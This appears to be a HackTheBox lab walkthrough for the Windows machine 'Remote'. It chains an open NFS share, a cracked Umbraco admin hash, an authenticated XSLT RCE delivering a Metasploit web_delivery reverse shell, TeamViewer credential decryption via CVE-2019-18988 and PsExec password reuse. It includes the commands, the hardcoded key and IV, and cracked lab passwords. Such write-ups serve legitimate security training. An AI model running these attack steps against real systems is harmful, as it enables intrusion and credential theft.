---
title: "HTB - Remote (Easy | Windows | Web)"
date: 2026-09-26 12:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, windows, teamviewer, gobuster, nfs, umbraco, john, metasploit, cve-2019-18988, psexec]
description: "An open NFS share leaks the Umbraco.sdf DB with an admin hash (cracked with John), authenticated Umbraco RCE via Metasploit, then TeamViewer stored creds (CVE-2019-18988) reused with PsExec for SYSTEM"
image:
  path: /assets/img/remote.png
---

## **Recon**

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Service Discovery Analysis

The Nmap scan reveals multiple critical services running on the target machine:

- **FTP (Port 21):** Microsoft ftpd — **anonymous login is allowed**, making it the first target
- **HTTP (Port 80):** Microsoft HTTPAPI hosting "Acme Widgets" — a web application to enumerate
- **RPC (Port 111):** rpcbind exposing **NFS** mounts — highly unusual on Windows and immediately suspicious
- **SMB (Port 139, 445):** Microsoft Windows file sharing
- **NFS (Port 2049):** Network File System — exposes mounted directories accessible without authentication
- **WinRM (Port 5985, 47001):** Windows Remote Management — shell access if credentials are obtained
- **RPC (Multiple high ports):** Various Windows RPC endpoints

**OS:** Windows

Three things stand out immediately: **anonymous FTP access**, **NFS running on Windows** (extremely unusual and often misconfigured), and **WinRM open** for potential remote shell access. NFS on Windows typically means someone configured it without understanding the security implications — it's likely exposing sensitive content.

---

## **User**

### Web Enumeration - HTTP (Port 80)

Accessing `http://<target>/` reveals the "Acme Widgets" e-commerce website:

![](/assets/img/remote/Pasted_image_20260928200703.png)

We perform directory fuzzing with gobuster to identify hidden paths and administrative panels:

```bash
gobuster dir -u http://<target>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![](/assets/img/remote/Pasted_image_20260928200813.png)

The `/umbraco/` directory is discovered — navigating to it reveals a CMS login panel.

### Overview - Umbraco CMS

**What is Umbraco?** Umbraco is an open-source .NET Content Management System (CMS) used to build and manage websites. It runs on Microsoft IIS and uses a SQL-based backend. The admin panel at `/umbraco/` is the primary interface for content editors and administrators.

**Why is it relevant here?** Umbraco version 7.12.4 (identified after login) contains an **authenticated Remote Code Execution vulnerability**. While we need credentials to exploit it, the application stores its database in `.sdf` files — a SQL Server Compact format — which can be read offline if we obtain them through another vector (the NFS share).

![](/assets/img/remote/Pasted_image_20260928200927.png)

### NFS Share Enumeration

Since FTP anonymous access yielded no files, we pivot to the NFS service. We use `showmount` to list exported NFS shares. The `-e` flag queries the server for its export list:

```bash
showmount -e <target>
```

```
Export list for <target>:
/site_backups (everyone)
```

The `/site_backups` share is exported to **everyone** — no authentication required. This is a critical misconfiguration that exposes what appears to be a full backup of the website. We mount the share:

```bash
mkdir ./mnt
sudo mount -t nfs -o nolock <target>:/site_backups ./mnt
```

![](/assets/img/remote/Pasted_image_20260928201122.png)

The mounted share reveals the complete Umbraco website directory structure.

### Extracting Credentials from Umbraco.sdf

### Overview - Umbraco.sdf Database

**What is a `.sdf` file?** SDF (SQL Server Compact Database) is a single-file embedded database format used by Microsoft SQL Server Compact Edition. Umbraco uses this file (`App_Data/Umbraco.sdf`) as its primary database when configured without a full SQL Server instance. It stores all CMS data including user accounts, password hashes, and site content in a single portable file.

**Why is it dangerous here?** Unlike a running SQL Server that requires authentication, the `.sdf` file can be read directly from the filesystem using standard tools like `strings` — extracting password hashes that can then be cracked offline.

We locate and read the Umbraco database file. The `strings` command extracts all printable character sequences from the binary file, and `head` limits the output to the first lines:

```bash
strings Umbraco.sdf | head
```

```
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

Two accounts with different hashing algorithms are identified:

- **admin@htb.local** — hash `b8be16afba8c314ad33d812f22a04991b90e2aaa` using **SHA1** (simpler, easier to crack)
- **smith@htb.local** — hash using **HMACSHA256** with a salt (much harder to crack)

We focus on the admin SHA1 hash. We crack it using John the Ripper:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
baconandcheese   (?)
```

**Admin credentials:** `admin@htb.local:baconandcheese`

### Umbraco Admin Panel - Authenticated RCE

We authenticate to the Umbraco admin panel at `http://<target>/umbraco/` with the cracked credentials:

![](/assets/img/remote/Pasted_image_20260929030120.png)

The panel reveals the Umbraco version: **7.12.4**

![](/assets/img/remote/Pasted_image_20260929030439.png)

### Overview - Umbraco 7.12.4 Authenticated RCE

**What is the vulnerability?** Umbraco CMS version 7.12.4 contains an authenticated Remote Code Execution vulnerability. The developer tools section in the admin panel allows execution of XSLT (Extensible Stylesheet Language Transformations) — a template language that can call .NET methods including `System.Diagnostics.Process.Start()`. By crafting a malicious XSLT payload, an authenticated administrator can execute arbitrary operating system commands on the underlying Windows server.

**Why does authentication matter?** Unlike unauthenticated RCE, this requires valid admin credentials — which we obtained by cracking the hash from the NFS-exposed database backup. The combination of NFS misconfiguration → credential theft → authenticated RCE is the complete exploitation chain.

A public exploit script is available. We configure it with the target URL and our admin credentials, then modify the command payload to use Metasploit's web delivery module:

![](/assets/img/remote/Pasted_image_20260929031921.png)

### Establishing Reverse Shell via Metasploit web_delivery

We set up Metasploit's `web_delivery` module to generate and serve a PowerShell payload. This module hosts a script on our attacker machine and generates a one-liner command that downloads and executes it in memory — no files written to disk:

```bash
msfconsole
use exploit/multi/script/web_delivery
set RHOSTS <target>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set target 2
run
```

![](/assets/img/remote/Pasted_image_20260929032248.png)

We copy the generated PowerShell one-liner into the exploit script's command field:

![](/assets/img/remote/Pasted_image_20260929032341.png)

Execute the exploit script, which triggers the Umbraco RCE to run our PowerShell payload:

```bash
python py.py
```

![](/assets/img/remote/Pasted_image_20260929032414.png)

A Meterpreter session is received. The user flag can now be retrieved:

![](/assets/img/remote/Pasted_image_20260929032546.png)

---

## **Root**

### Running Services Enumeration

After gaining initial access, we enumerate running services to identify potential privilege escalation vectors. The `tasklist /svc` command lists all processes alongside their associated Windows services:

```powershell
tasklist /svc
TeamViewer_Service.exe        2180 TeamViewer7
```

**TeamViewer 7** is running as a service — a significant finding.

### Overview - CVE-2019-18988 (TeamViewer Stored Credentials Disclosure)

**What is TeamViewer?** TeamViewer is a popular remote desktop and support application used by IT teams for remote access and administration. It stores connection credentials in the Windows registry for persistence.

**What is CVE-2019-18988?** TeamViewer versions 7.0.43148 through 14.7.1965 store user passwords encrypted in the Windows registry using **AES-128-CBC** with a hardcoded key and IV:

- **Key:** `0602000000a400005253413100040000`
- **IV:** `0100010067244F436E6762F25EA8D704`

Since the encryption key is hardcoded and publicly known, anyone with read access to the registry can decrypt the stored TeamViewer passwords. This is a classic case of security through obscurity failing completely.

**Why is this relevant?** If the TeamViewer password is reused for the Windows Administrator account (a common practice), we can leverage it to escalate to SYSTEM via SMB/PsExec.

### Extracting TeamViewer Credentials via Metasploit

We background the current Meterpreter session and use the `teamviewer_passwords` post-exploitation module. This module reads the registry keys where TeamViewer stores encrypted credentials and automatically decrypts them using the known hardcoded key:

```powershell
use post/windows/gather/credentials/teamviewer_passwords
set SESSION 1
run
```

![](/assets/img/remote/Pasted_image_20260929032846.png)

**TeamViewer password discovered:** `!R3m0te!`

### Privilege Escalation via PsExec - Password Reuse

The TeamViewer password alone doesn't grant us elevated access, but it may have been reused for the Windows Administrator account. Since SMB is running, we test this hypothesis using Metasploit's `psexec` module. PsExec authenticates to the SMB service, copies a service binary to the target, and executes it as SYSTEM — providing a SYSTEM-level shell:

```bash
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBPass !R3m0te!
set SMBUser administrator
set LHOST tun0
run
```

![](/assets/img/remote/Pasted_image_20260929033135.png)

A SYSTEM-level shell is established confirming password reuse between TeamViewer and the local Administrator account. The root flag can now be retrieved:

![](/assets/img/remote/Pasted_image_20260929033230.png)

### Alternative Root - SeImpersonatePrivilege

An alternative privilege escalation path exists through the `SeImpersonatePrivilege` token privilege available to the IIS service account. This privilege allows the use of potato-style attacks (such as PrintSpoofer or JuicyPotato) to impersonate the SYSTEM token and achieve full privilege escalation — useful in environments where TeamViewer password reuse is not present.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified anonymous FTP on port 21, "Acme Widgets" web application on port 80, NFS exposed on port 2049 (extremely unusual on Windows), SMB on port 445, and WinRM on port 5985
2. **Web Enumeration:** gobuster discovered `/umbraco/` hosting an Umbraco CMS login panel
3. **NFS Enumeration:** Used `showmount` to discover `/site_backups` exported to everyone; mounted the NFS share to access the full website backup
4. **Credential Extraction:** Located `App_Data/Umbraco.sdf` database file; used `strings` to extract user hashes; identified admin SHA1 hash
5. **Hash Cracking:** Cracked admin SHA1 hash with John the Ripper to obtain `admin@htb.local:baconandcheese`
6. **Umbraco Login:** Authenticated to Umbraco admin panel and confirmed version 7.12.4 (vulnerable to authenticated RCE)
7. **Authenticated RCE:** Used public Umbraco 7.12.4 exploit with Metasploit web_delivery PowerShell payload to obtain Meterpreter shell; retrieved user flag
8. **Service Enumeration:** Discovered TeamViewer 7 running as a service via `tasklist /svc`
9. **CVE-2019-18988:** Used Metasploit `teamviewer_passwords` module to decrypt registry-stored TeamViewer credentials, obtaining password `!R3m0te!`
10. **Password Reuse:** Leveraged TeamViewer password as Administrator SMB credential via Metasploit PsExec module
11. **SYSTEM Access:** Obtained SYSTEM-level shell via PsExec and retrieved root flag